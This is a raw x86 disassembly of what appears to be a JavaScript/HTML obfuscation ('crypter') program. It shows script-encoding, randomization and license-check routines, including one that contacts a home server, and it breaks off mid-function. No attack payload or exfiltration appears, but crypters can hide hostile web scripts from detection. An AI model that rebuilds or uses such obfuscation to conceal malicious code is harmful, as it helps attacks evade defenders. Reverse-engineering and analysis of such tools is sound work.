mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    eax,DWORD PTR [ebp-0x30]
lea    ebx,[ecx-0x1]
pop    ecx
pop    edi
lea    edi,[eax+ebx*1+0x1]
push   edi
push   esi
call   804da74 <xrealloc>
add    esp,0x10
test   eax,eax
mov    esi,eax
je     804b7c0 <js_crypter_html_to_wchar+0x12c>
mov    edx,DWORD PTR [ebp-0x30]
mov    BYTE PTR [eax+edx*1],bl
lea    eax,[eax+edx*1+0x1]
push   edx
push   ebx
lea    ecx,[ebp-0x28]
push   ecx
push   eax
call   8048ccc <memcpy@plt>
inc    DWORD PTR [ebp-0x2c]
mov    eax,DWORD PTR [ebp+0xc]
add    esp,0x10
mov    DWORD PTR [ebp-0x30],edi
cmp    DWORD PTR [ebp-0x2c],eax
jb     804b710 <js_crypter_html_to_wchar+0x7c>
mov    edx,DWORD PTR [ebp-0x30]
mov    ecx,DWORD PTR [ebp+0x10]
sub    esp,0xc
mov    DWORD PTR [ecx],edx
push   DWORD PTR [ebp-0x34]
call   8048f8c <free@plt>
add    esp,0x10
lea    esp,[ebp-0xc]
pop    ebx
mov    eax,esi
pop    esi
pop    edi
leave  
ret    
nop
sub    esp,0xc
push   DWORD PTR [ebp+0x10]
push   DWORD PTR [ebp+0xc]
push   ebx
push   0x804ee64
push   0x6
call   804a860 <seterror>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
sub    esp,0xc
push   DWORD PTR [ebp-0x34]
call   8048f8c <free@plt>
add    esp,0x10
test   esi,esi
je     804b7b6 <js_crypter_html_to_wchar+0x122>
sub    esp,0xc
push   esi
call   8048f8c <free@plt>
add    esp,0x10
jmp    804b7b6 <js_crypter_html_to_wchar+0x122>
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x5c
mov    ebx,DWORD PTR [ebp+0x8]
mov    al,BYTE PTR [ebp+0x10]
xor    esi,esi
test   ebx,ebx
mov    edi,DWORD PTR [ebp+0xc]
mov    BYTE PTR [ebp-0x4d],al
mov    DWORD PTR [ebp-0x54],0x0
mov    DWORD PTR [ebp-0x5c],0x0
je     804b80d <js_crypter_encode+0x2d>
test   edi,edi
jne    804b830 <js_crypter_encode+0x50>
sub    esp,0xc
movsx  eax,BYTE PTR [ebp-0x4d]
push   eax
push   edi
push   ebx
push   0x804edac
push   0x6
call   804a860 <seterror>
xor    eax,eax
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
sub    esp,0xc
push   0x0
call   8048eac <time@plt>
mov    DWORD PTR [esp],eax
call   8048e8c <srand@plt>
add    esp,0xc
lea    eax,[ebp-0x4c]
push   eax
push   edi
push   ebx
call   804b694 <js_crypter_html_to_wchar>
mov    DWORD PTR [ebp-0x60],eax
mov    ecx,DWORD PTR [ebp-0x60]
add    esp,0x10
xor    eax,eax
test   ecx,ecx
je     804b825 <js_crypter_encode+0x45>
call   804b1f8 <js_crypter_make_vars>
test   eax,eax
je     804bcee <js_crypter_encode+0x50e>
xor    eax,eax
cld    
mov    edi,0x804e800
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
sub    esp,0xc
add    ecx,0xffff
push   ecx
call   804d878 <xmalloc>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x5c],eax
je     804bcee <js_crypter_encode+0x50e>
xor    edi,edi
call   804b2a4 <js_randomizer>
mov    DWORD PTR [ebp+edi*4-0x38],eax
inc    edi
cmp    edi,0x6
jbe    804b89c <js_crypter_encode+0xbc>
sub    esp,0xc
push   DWORD PTR [ebp-0x20]
push   DWORD PTR [ebp-0x24]
push   0x8056420
push   0x8056300
push   0x80563a0
push   0x8056420
push   0x8056400
push   0x80563a0
push   0x8056400
push   0x80563a0
push   0x8056400
push   0x8056400
push   0x80563a0
push   0x8056400
push   0x8056300
push   0x80563e0
push   0x8056340
push   0x8056340
push   0x8056280
push   0x8056340
push   0x8056340
push   0x8056280
push   0x8056360
push   0x80563a0
push   0x8056380
push   0x8056360
push   0x8056300
push   0x80561e0
push   0x8056380
push   0x8056300
push   0x80561e0
push   0x8056380
push   0x8056380
push   0x80563e0
push   0x8056300
push   0x8056340
push   0x8056340
push   0x8056280
push   0x8056340
push   0x8056340
push   0x8056280
push   0x8056360
push   0x80563e0
push   0x8056380
push   0x8056360
push   0x8056300
push   0x80561e0
push   0x8056380
push   0x8056300
push   0x80561e0
push   0x8056380
push   0x8056380
push   0x80563a0
push   0x80563e0
push   0x8056300
push   0x80561e0
push   0x8056300
push   0x8056300
push   0x8056420
push   0x80563e0
push   0x8056380
push   0x8056360
push   0x8056340
push   0x8056300
push   0x80562c0
push   0x80562e0
push   0x8056280
push   0x80562e0
push   0x80562e0
push   0x80562e0
push   0x8056240
push   0x80562e0
push   0x8056220
push   0x8056240
push   0x80562c0
push   0x80562c0
push   0x80562c0
push   0x8056240
push   0x80562c0
push   0x8056220
push   0x8056240
push   0x80562e0
push   0x80562c0
push   0x8056220
push   0x8056220
push   0x8056220
push   0x8056240
push   0x8056200
push   0x8056220
push   0x80562a0
push   0x8056220
push   0x8056240
push   0x8056260
push   0x8056240
push   0x8056240
push   0x8056220
push   0x8056300
push   0x8056320
push   0x80562a0
push   0x8056300
push   0x8056320
push   0x80562a0
push   0x8056240
push   0x8056320
push   0x80562a0
push   0x8056300
push   0x8056320
push   0x80562a0
push   0x8056300
push   0x8056320
push   0x8056320
push   0x8056320
push   0x8056240
push   0x8056240
push   0x8056240
push   0x8056300
push   0x8056300
push   0x8056300
push   0x8056240
push   0x8056300
push   0x80562a0
push   0x8056300
push   0x8056300
push   0x8056300
push   0x80562a0
push   0x80563a0
push   DWORD PTR [ebp-0x28]
push   0x8056280
push   DWORD PTR [ebp-0x2c]
push   0x8056220
push   DWORD PTR [ebp-0x30]
push   0x8056200
push   0x8056260
push   DWORD PTR [ebp-0x34]
push   0x8056240
push   DWORD PTR [ebp-0x38]
push   0x8056200
push   0x80561e0
push   0x80563c0
push   0x804e800
push   DWORD PTR [ebp-0x5c]
call   8048edc <sprintf@plt>
xor    edi,edi
add    esp,0x240
jmp    804bb76 <js_crypter_encode+0x396>
mov    esi,esi
inc    edi
cmp    edi,0x6
ja     804bb98 <js_crypter_encode+0x3b8>
mov    eax,DWORD PTR [ebp+edi*4-0x38]
test   eax,eax
je     804bb70 <js_crypter_encode+0x390>
sub    esp,0xc
push   eax
call   8048f8c <free@plt>
mov    DWORD PTR [ebp+edi*4-0x38],0x0
inc    edi
add    esp,0x10
cmp    edi,0x6
jbe    804bb76 <js_crypter_encode+0x396>
xor    eax,eax
cld    
mov    edi,DWORD PTR [ebp-0x5c]
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
sub    esp,0x8
dec    ecx
push   ecx
push   DWORD PTR [ebp-0x5c]
mov    DWORD PTR [ebp-0x58],ecx
call   804b12c <js_crypter_validate>
mov    ebx,eax
add    esp,0x10
xor    eax,eax
test   ebx,ebx
je     804b825 <js_crypter_encode+0x45>
sub    esp,0xc
push   ebx
call   804d588 <upcase>
pop    eax
pop    edx
push   0x0
push   ebx
call   804a318 <Crc32Str>
add    esp,0xc
push   eax
push   0x804edca
lea    esi,[ebp-0x48]
push   esi
call   8048edc <sprintf@plt>
mov    edi,esi
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
mov    DWORD PTR [esp],esi
call   804d588 <upcase>
xor    eax,eax
mov    BYTE PTR [ebp-0x40],0x0
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
push   ecx
push   DWORD PTR [ebp-0x4c]
push   esi
push   DWORD PTR [ebp-0x60]
call   804af84 <js_crypter_alg>
add    esp,0x20
test   eax,eax
mov    esi,eax
je     804bcee <js_crypter_encode+0x50e>
cmp    BYTE PTR [ebp-0x4d],0x0
je     804bccc <js_crypter_encode+0x4ec>
mov    edi,eax
cld    
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    edi,DWORD PTR [ebp-0x58]
sub    esp,0xc
lea    ecx,[ecx+edi*1+0x3ff]
push   ecx
call   804d878 <xmalloc>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x54],eax
je     804bcee <js_crypter_encode+0x50e>
sub    esp,0xc
push   esi
push   0x80563c0
push   DWORD PTR [ebp-0x5c]
push   0x804edcf
push   eax
call   8048edc <sprintf@plt>
mov    eax,DWORD PTR [ebp-0x60]
add    esp,0x20
test   eax,eax
je     804bc90 <js_crypter_encode+0x4b0>
sub    esp,0xc
push   DWORD PTR [ebp-0x60]
call   8048f8c <free@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp-0x5c]
test   eax,eax
je     804bca5 <js_crypter_encode+0x4c5>
sub    esp,0xc
push   DWORD PTR [ebp-0x5c]
call   8048f8c <free@plt>
add    esp,0x10
test   esi,esi
je     804bcb5 <js_crypter_encode+0x4d5>
sub    esp,0xc
push   esi
call   8048f8c <free@plt>
add    esp,0x10
cmp    BYTE PTR [ebp-0x4d],0x0
mov    eax,DWORD PTR [ebp-0x54]
jne    804b825 <js_crypter_encode+0x45>
mov    eax,0xffffffff
jmp    804b825 <js_crypter_encode+0x45>
sub    esp,0x8
push   0x804eca0
push   eax
push   0x80563c0
push   DWORD PTR [ebp-0x5c]
push   0x804ece0
push   0x804eddc
call   8048c2c <printf@plt>
jmp    804bc78 <js_crypter_encode+0x498>
mov    eax,DWORD PTR [ebp-0x60]
test   eax,eax
je     804bd03 <js_crypter_encode+0x523>
sub    esp,0xc
push   DWORD PTR [ebp-0x60]
call   8048f8c <free@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp-0x5c]
test   eax,eax
je     804bd18 <js_crypter_encode+0x538>
sub    esp,0xc
push   DWORD PTR [ebp-0x5c]
call   8048f8c <free@plt>
add    esp,0x10
test   esi,esi
je     804b823 <js_crypter_encode+0x43>
sub    esp,0xc
push   esi
call   8048f8c <free@plt>
add    esp,0x10
jmp    804b823 <js_crypter_encode+0x43>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   ebx
cmp    BYTE PTR [ebp+0xc],0x0
jne    804bdec <js_crypter_print+0xb8>
mov    edi,DWORD PTR [ebp+0x8]
xor    eax,eax
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
mov    ebx,ecx
not    ebx
sub    esp,0xc
lea    eax,[ebx+0xb]
push   eax
call   804d878 <xmalloc>
add    esp,0x10
test   eax,eax
mov    edi,eax
mov    DWORD PTR ds:0x8056440,0x0
je     804bdc4 <js_crypter_print+0x90>
sub    esp,0x8
mov    DWORD PTR [eax],0x65742f3c
mov    DWORD PTR [eax+0x4],0x72617478
mov    DWORD PTR [eax+0x8],0x3e6165
push   DWORD PTR [ebp+0x8]
push   eax
call   8048d8c <strcat@plt>
add    esp,0xc
push   0x0
lea    eax,[ebx+0xa]
push   eax
push   edi
call   804b7e0 <js_crypter_encode>
mov    ebx,eax
mov    DWORD PTR [esp],edi
call   8048f8c <free@plt>
add    esp,0x10
test   ebx,ebx
mov    edi,ebx
je     804bdc4 <js_crypter_print+0x90>
xor    eax,eax
test   edi,edi
setne  al
lea    esp,[ebp-0x8]
pop    ebx
pop    edi
leave  
ret    
nop
sub    esp,0x10
call   804a988 <geterror>
pop    ebx
pop    edx
push   eax
push   0x804e780
call   8048c2c <printf@plt>
add    esp,0x10
xor    eax,eax
test   edi,edi
setne  al
lea    esp,[ebp-0x8]
pop    ebx
pop    edi
leave  
ret    
mov    esi,esi
sub    esp,0x8
push   0x0
push   0x804e047
call   804d228 <print_headers>
add    esp,0x10
jmp    804bd43 <js_crypter_print+0xf>
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x38
mov    ebx,DWORD PTR [ebp+0x8]
mov    edi,DWORD PTR [ebp+0x10]
push   0x804ee94
call   8048c9c <getenv@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x1c],eax
push   0x100
push   0x0
push   ebx
call   8048e5c <memset@plt>
mov    ecx,DWORD PTR [ebp-0x1c]
add    esp,0x10
test   ecx,ecx
je     804bfc4 <license_load+0x1c0>
sub    esp,0x8
push   0x3a
push   DWORD PTR [ebp-0x1c]
call   8048f5c <strchr@plt>
add    esp,0x10
test   eax,eax
je     804be55 <license_load+0x51>
mov    BYTE PTR [eax],0x0
sub    esp,0x8
push   0x804eea0
push   edi
call   8048e4c <fopen@plt>
add    esp,0x10
test   eax,eax
mov    esi,eax
je     804bfe4 <license_load+0x1e0>
push   eax
push   0x1
push   0x100
push   ebx
call   8048e2c <fread@plt>
add    esp,0x10
dec    eax
je     804bea4 <license_load+0xa0>
sub    esp,0xc
push   0x21
call   804a860 <seterror>
mov    DWORD PTR [esp],esi
call   8048e9c <fclose@plt>
xor    edx,edx
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    eax,edx
pop    edi
leave  
ret    
mov    esi,esi
sub    esp,0x8
push   0x4
lea    eax,[ebx+0xf4]
push   eax
call   804a318 <Crc32Str>
add    esp,0x10
cmp    DWORD PTR [ebx+0xf8],eax
je     804bedb <license_load+0xd7>
sub    esp,0xc
push   esi
call   8048e9c <fclose@plt>
add    esp,0x10
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    edx,0x1
mov    eax,edx
pop    edi
leave  
ret    
mov    edi,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x20],0x0
cld    
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
sub    esp,0xc
mov    DWORD PTR [ebp-0x24],ecx
push   ecx
call   8048cec <malloc@plt>
mov    DWORD PTR [ebp-0x28],eax
xor    ecx,ecx
add    esp,0x10
lea    edi,[ebp-0x18]
mov    edx,ebx
nop
mov    al,BYTE PTR [edx+0x10]
xor    al,BYTE PTR [edx+0xf4]
mov    BYTE PTR [ebp+ecx*1-0x10],al
mov    al,BYTE PTR [edx+0x8]
xor    al,BYTE PTR [edx+0xec]
mov    BYTE PTR [ebp+ecx*1-0x14],al
mov    al,BYTE PTR [edx+0x4]
xor    al,BYTE PTR [edx]
mov    BYTE PTR [edi+ecx*1],al
inc    ecx
inc    edx
cmp    ecx,0x3
jbe    804bf0c <license_load+0x108>
mov    eax,DWORD PTR [ebx+0xfc]
mov    edx,DWORD PTR [ebp-0x18]
cmp    eax,edx
je     804bff4 <license_load+0x1f0>
sub    esp,0x8
mov    DWORD PTR [ebx+0xfc],edx
push   0x100
push   ebx
mov    edi,eax
call   804a318 <Crc32Str>
add    esp,0x10
cmp    eax,edi
mov    DWORD PTR [ebp-0x2c],eax
jne    804c016 <license_load+0x212>
cmp    DWORD PTR [ebp-0x20],0x1
je     804c060 <license_load+0x25c>
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [ebx+0xec],eax
xor    ecx,ecx
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [ebx+0xf4],eax
jmp    804bf9d <license_load+0x199>
mov    esi,esi
mov    al,BYTE PTR [ecx+ebx*1+0x14]
mov    edx,DWORD PTR [ebp-0x1c]
xor    al,BYTE PTR [edx+ecx*1]
mov    edx,DWORD PTR [ebp-0x28]
mov    BYTE PTR [edx+ecx*1],al
inc    ecx
cmp    ecx,DWORD PTR [ebp-0x24]
jb     804bf8c <license_load+0x188>
sub    esp,0x8
push   DWORD PTR [ebp-0x24]
push   DWORD PTR [ebp-0x28]
call   804a318 <Crc32Str>
add    esp,0x10
cmp    DWORD PTR [ebx+0xf0],eax
mov    edx,0x1
je     804be98 <license_load+0x94>
sub    esp,0x8
push   0x0
push   0x804e047
call   804d228 <print_headers>
mov    DWORD PTR [esp],0x804eea4
call   8048c2c <printf@plt>
jmp    804be96 <license_load+0x92>
sub    esp,0x8
push   edi
push   0x8
call   804a860 <seterror>
jmp    804be96 <license_load+0x92>
mov    DWORD PTR [ebp-0x20],0x1
push   edx
push   0x0
push   ebx
push   DWORD PTR [ebp+0xc]
call   804c2bc <connect_to_homeserver>
add    esp,0x10
test   eax,eax
je     804c036 <license_load+0x232>
mov    edx,DWORD PTR [ebp-0x18]
jmp    804bf46 <license_load+0x142>
sub    esp,0x8
push   0x0
push   0x804e047
call   804d228 <print_headers>
mov    DWORD PTR [esp],0x804eea4
call   8048c2c <printf@plt>
jmp    804be8e <license_load+0x8a>
sub    esp,0x8
mov    DWORD PTR [ebx+0xfc],0x0
push   0x0
push   0x804e047
call   804d228 <print_headers>
mov    DWORD PTR [esp],0x804eeaf
call   8048c2c <printf@plt>
jmp    804be8e <license_load+0x8a>
push   eax
push   0x0
push   0x0
push   esi
call   8048dac <fseek@plt>
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [ebx+0xfc],eax
push   esi
push   0x1
push   0x100
push   ebx
call   8048f0c <fwrite@plt>
add    esp,0x14
push   esi
call   8048e9c <fclose@plt>
add    esp,0x10
jmp    804bf74 <license_load+0x170>
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x10
mov    ebx,DWORD PTR [ebp+0x8]
push   ebx
call   8048cac <__inet_addr@plt>
add    esp,0x10
cmp    eax,0xffffffff
je     804c0b4 <resolve_host+0x20>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
lea    esi,[esi+0x0]
sub    esp,0xc
push   ebx
call   8048ecc <gethostbyname@plt>
mov    edx,eax
add    esp,0x10
xor    eax,eax
test   edx,edx
je     804c0ac <resolve_host+0x18>
mov    eax,DWORD PTR [edx+0x10]
mov    eax,DWORD PTR [eax]
mov    eax,DWORD PTR [eax]
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0xc
mov    ebx,DWORD PTR [ebp+0x8]
push   0x3
push   ebx
call   8048f6c <fcntl@plt>
add    esp,0x10
test   eax,eax
js     804c10c <setnonblocking+0x38>
push   eax
push   0x4
push   0x4
push   ebx
call   8048f6c <fcntl@plt>
add    esp,0x10
test   eax,eax
mov    edx,0x1
js     804c122 <setnonblocking+0x4e>
mov    eax,edx
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
nop
sub    esp,0xc
push   0x804eecf
call   8048cdc <puts@plt>
xor    edx,edx
mov    eax,edx
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
sub    esp,0xc
push   0x804eede
jmp    804c114 <setnonblocking+0x40>
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x9c
mov    eax,DWORD PTR [ebp+0x14]
test   eax,eax
mov    edi,DWORD PTR [ebp+0x8]
jne    804c1d0 <async_write+0xa4>
mov    DWORD PTR [ebp-0xa0],0x5
mov    DWORD PTR [ebp-0x9c],0x0
lea    edx,[ebp-0x98]
mov    eax,0x20
lea    esi,[esi+0x0]
dec    eax
test   eax,eax
mov    DWORD PTR [edx+eax*4],0x0
jne    804c168 <async_write+0x3c>
mov    esi,edi
and    esi,0x1f
mov    ecx,esi
mov    ebx,edi
mov    al,0x1
shl    eax,cl
shr    ebx,0x5
or     DWORD PTR [ebp+ebx*4-0x98],eax
xor    ecx,ecx
test   edi,edi
jle    804c1c6 <async_write+0x9a>
sub    esp,0xc
lea    eax,[ebp-0xa0]
push   eax
push   0x0
push   edx
push   0x0
mov    eax,ds:0x80559a0
inc    eax
push   eax
call   8048d1c <select@plt>
add    esp,0x20
xor    ecx,ecx
test   eax,eax
jle    804c1c6 <async_write+0x9a>
mov    ecx,esi
mov    eax,DWORD PTR [ebp+ebx*4-0x98]
shr    eax,cl
xor    ecx,ecx
test   al,0x1
jne    804c1db <async_write+0xaf>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    eax,ecx
pop    edi
leave  
ret    
mov    DWORD PTR [ebp-0xa0],eax
jmp    804c150 <async_write+0x24>
push   edx
push   DWORD PTR [ebp+0x10]
push   DWORD PTR [ebp+0xc]
push   edi
call   8048d6c <write@plt>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    ecx,eax
mov    eax,ecx
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x9c
mov    eax,DWORD PTR [ebp+0x14]
test   eax,eax
mov    edi,DWORD PTR [ebp+0x8]
jne    804c298 <async_read+0xa4>
mov    DWORD PTR [ebp-0xa0],0x5
mov    DWORD PTR [ebp-0x9c],0x0
lea    edx,[ebp-0x98]
mov    eax,0x20
lea    esi,[esi+0x0]
dec    eax
test   eax,eax
mov    DWORD PTR [edx+eax*4],0x0
jne    804c230 <async_read+0x3c>
mov    esi,edi
and    esi,0x1f
mov    ecx,esi
mov    ebx,edi
mov    al,0x1
shl    eax,cl
shr    ebx,0x5
or     DWORD PTR [ebp+ebx*4-0x98],eax
xor    ecx,ecx
test   edi,edi
jle    804c28e <async_read+0x9a>
sub    esp,0xc
lea    eax,[ebp-0xa0]
push   eax
push   0x0
push   0x0
push   edx
mov    eax,ds:0x80559a0
inc    eax
push   eax
call   8048d1c <select@plt>
add    esp,0x20
xor    ecx,ecx
test   eax,eax
jle    804c28e <async_read+0x9a>
mov    ecx,esi
mov    eax,DWORD PTR [ebp+ebx*4-0x98]
shr    eax,cl
xor    ecx,ecx
test   al,0x1
jne    804c2a3 <async_read+0xaf>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    eax,ecx
pop    edi
leave  
ret    
mov    DWORD PTR [ebp-0xa0],eax
jmp    804c218 <async_read+0x24>
push   ecx
push   DWORD PTR [ebp+0x10]
push   DWORD PTR [ebp+0xc]
push   edi
call   8048ddc <read@plt>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    ecx,eax
mov    eax,ecx
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x145c
xor    esi,esi
sub    esp,0xc
push   DWORD PTR [esi*4+0x8055758]
mov    DWORD PTR [ebp-0x1450],0x0
mov    WORD PTR [ebp-0x1026],0x5000
mov    BYTE PTR [ebp-0x1027],0x2
call   804c094 <resolve_host>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x1024],eax
jne    804c310 <connect_to_homeserver+0x54>
inc    esi
je     804c2ca <connect_to_homeserver+0xe>
xor    eax,eax
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ecx
push   0x6
push   0x1
push   0x2
call   8048d0c <socket@plt>
add    esp,0x10
cmp    eax,0xffffffff
mov    DWORD PTR [ebp-0x1454],eax
je     804c300 <connect_to_homeserver+0x44>
cmp    eax,DWORD PTR ds:0x80559a0
jle    804c337 <connect_to_homeserver+0x7b>
mov    ds:0x80559a0,eax
sub    esp,0xc
push   0x4
lea    eax,[ebp-0x144c]
push   eax
push   0x4
push   0xffff
push   DWORD PTR [ebp-0x1454]
mov    DWORD PTR [ebp-0x144c],0x0
call   8048d9c <setsockopt@plt>
add    esp,0x14
push   DWORD PTR [ebp-0x1454]
call   804c0d4 <setnonblocking>
add    esp,0xc
push   0x10
lea    eax,[ebp-0x1028]
push   eax
push   DWORD PTR [ebp-0x1454]
call   8048c6c <connect@plt>
add    esp,0xc
push   0x100
push   DWORD PTR [ebp+0xc]
lea    ebx,[ebp-0x1438]
push   ebx
call   8048ccc <memcpy@plt>
pop    eax
pop    edx
push   0x100
push   ebx
call   804dd08 <urlencoden>
mov    edi,eax
pop    eax
push   DWORD PTR [esi*4+0x8055758]
push   edi
mov    eax,DWORD PTR [ebp+0x8]
push   DWORD PTR [eax+0x1c]
push   0x804eefc
lea    edx,[ebp-0x1018]
push   edx
call   8048edc <sprintf@plt>
add    esp,0x20
push   0x5
xor    eax,eax
cld    
mov    ecx,0xffffffff
lea    edi,[ebp-0x1018]
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
push   ecx
lea    ecx,[ebp-0x1018]
push   ecx
push   DWORD PTR [ebp-0x1454]
call   804c12c <async_write>
add    esp,0x10
test   eax,eax
jg     804c412 <connect_to_homeserver+0x156>
sub    esp,0xc
push   DWORD PTR [ebp-0x1454]
call   8048f7c <close@plt>
add    esp,0x10
jmp    804c300 <connect_to_homeserver+0x44>
mov    DWORD PTR [ebp-0x1458],0x0
xor    edi,edi
jmp    804c457 <connect_to_homeserver+0x19b>
mov    ebx,DWORD PTR [ebp-0x1458]
sub    esp,0x8
add    ebx,esi
push   ebx
push   edi
call   8048e0c <realloc@plt>
add    esp,0xc
push   esi
mov    edx,DWORD PTR [ebp-0x1458]
lea    ecx,[ebp-0x1018]
push   ecx
mov    edi,eax
lea    eax,[eax+edx*1]
push   eax
call   8048ccc <memcpy@plt>
mov    DWORD PTR [ebp-0x1458],ebx
add    esp,0x10
push   0x5
push   0x1000
lea    eax,[ebp-0x1018]
push   eax
push   DWORD PTR [ebp-0x1454]
call   804c1f4 <async_read>
add    esp,0x10
test   eax,eax
mov    esi,eax
jg     804c420 <connect_to_homeserver+0x164>
sub    esp,0xc
push   DWORD PTR [ebp-0x1454]
call   8048f7c <close@plt>
add    esp,0x10
test   edi,edi
je     804c57a <connect_to_homeserver+0x2be>
sub    esp,0x8
push   0x804eeed
push   edi
call   8048dbc <strstr@plt>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x145c],eax
je     804c585 <connect_to_homeserver+0x2c9>
mov    BYTE PTR [eax],0x0
add    eax,0x4
mov    DWORD PTR [ebp-0x145c],eax
sub    esp,0x8
push   0x804eef2
push   edi
call   8048dbc <strstr@plt>
add    esp,0x10
test   eax,eax
mov    esi,eax
je     804c568 <connect_to_homeserver+0x2ac>
add    esi,0x8
mov    DWORD PTR [ebp-0x1460],0x0
mov    al,BYTE PTR [esi]
cmp    al,0xd
je     804c568 <connect_to_homeserver+0x2ac>
cmp    al,0xa
je     804c568 <connect_to_homeserver+0x2ac>
mov    dl,BYTE PTR [esi+0x1]
cmp    dl,0xa
je     804c568 <connect_to_homeserver+0x2ac>
cmp    dl,0xd
je     804c568 <connect_to_homeserver+0x2ac>
mov    dl,al
mov    BYTE PTR [ebp-0x1448],dl
mov    edx,DWORD PTR [ebp-0x1460]
mov    al,BYTE PTR [esi+edx*2+0x1]
mov    BYTE PTR [ebp-0x1447],al
push   eax
push   0x10
push   0x0
lea    ecx,[ebp-0x1448]
push   ecx
lea    ebx,[ebp-0x1450]
sub    ebx,edx
mov    BYTE PTR [ebp-0x1446],0x0
call   8048cfc <strtoul@plt>
mov    BYTE PTR [ebx+0x3],al
inc    DWORD PTR [ebp-0x1460]
add    esp,0x10
cmp    DWORD PTR [ebp-0x1460],0x3
jg     804c568 <connect_to_homeserver+0x2ac>
mov    eax,DWORD PTR [ebp-0x1460]
mov    dl,BYTE PTR [esi+eax*2]
cmp    dl,0xd
je     804c568 <connect_to_homeserver+0x2ac>
cmp    dl,0xa
je     804c568 <connect_to_homeserver+0x2ac>
mov    al,BYTE PTR [esi+eax*2+0x1]
cmp    al,0xa
je     804c568 <connect_to_homeserver+0x2ac>
cmp    al,0xd
jne    804c4fe <connect_to_homeserver+0x242>
cmp    DWORD PTR [ebp+0x10],0x1
je     804c5ab <connect_to_homeserver+0x2ef>
sub    esp,0xc
push   edi
call   8048f8c <free@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp-0x1450]
jmp    804c305 <connect_to_homeserver+0x49>
sub    esp,0x8
push   0x804e01d
push   edi
call   8048dbc <strstr@plt>
add    esp,0x10
test   eax,eax
mov    DWORD PTR [ebp-0x145c],eax
je     804c5d7 <connect_to_homeserver+0x31b>
mov    BYTE PTR [eax],0x0
add    eax,0x2
jmp    804c4b7 <connect_to_homeserver+0x1fb>
mov    eax,DWORD PTR [ebp-0x145c]
sub    eax,edi
push   DWORD PTR ds:0x8055920
sub    DWORD PTR [ebp-0x1458],eax
push   DWORD PTR [ebp-0x1458]
push   0x1
push   DWORD PTR [ebp-0x145c]
call   8048f0c <fwrite@plt>
add    esp,0x10
jmp    804c56e <connect_to_homeserver+0x2b2>
mov    DWORD PTR [ebp-0x145c],edi
jmp    804c4bd <connect_to_homeserver+0x201>
nop
nop
push   ebp
mov    ebp,esp
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [eax],0x67452301
mov    DWORD PTR [eax+0x4],0xefcdab89
mov    DWORD PTR [eax+0x8],0x98badcfe
mov    DWORD PTR [eax+0xc],0x10325476
mov    DWORD PTR [eax+0x10],0x0
mov    DWORD PTR [eax+0x54],0x0
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
lea    ecx,[ebp-0x88]
sub    esp,0x88
mov    edx,0x80
mov    BYTE PTR [ecx],0x0
inc    ecx
dec    edx
jne    804c62c <burn_stack+0x14>
add    eax,0xffffff80
test   eax,eax
jle    804c63f <burn_stack+0x27>
call   804c618 <burn_stack>
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x60
mov    esi,DWORD PTR [eax+0x4]
mov    edi,DWORD PTR [eax+0x8]
mov    ebx,DWORD PTR [eax]
mov    DWORD PTR [ebp-0x5c],eax
mov    eax,DWORD PTR [eax+0xc]
push   0x40
push   edx
mov    DWORD PTR [ebp-0x60],eax
lea    eax,[ebp-0x58]
push   eax
call   8048ccc <memcpy@plt>
mov    eax,DWORD PTR [ebp-0x60]
xor    eax,edi
and    eax,esi
xor    eax,DWORD PTR [ebp-0x60]
add    eax,DWORD PTR [ebp-0x58]
lea    ebx,[eax+ebx*1-0x28955b88]
rol    ebx,0x7
mov    eax,esi
add    ebx,esi
